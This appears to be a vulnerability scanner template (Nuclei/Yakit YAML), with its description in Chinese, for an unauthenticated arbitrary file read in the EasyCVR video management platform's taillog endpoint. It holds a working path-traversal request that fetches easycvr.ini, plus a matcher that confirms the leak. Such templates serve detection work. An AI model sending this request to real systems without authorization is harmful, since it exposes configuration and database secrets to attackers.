info:
  name: EasyCVR视频管理平台taillog任意文件读取漏洞
  author: Deans
  severity: high
  description: EasyCVR-视频管理平台 taillog 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件、数据库配置文件等等，导致网站处于极度不安全状态。

  - https://cve.mitre.org/
  metadata:
    max-request: 1
    shodan-query: ""
    verified: true
  yakit-info:
    sign: 042cc0c236a45d5d4a5e60d7df12e255

http:
- raw:
  - |+
    @timeout: 30s
    GET /taillog/oxsecl/..\easycvr.ini HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close


  max-redirects: 3
  disable-cookie: true
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - base_config
    condition: and
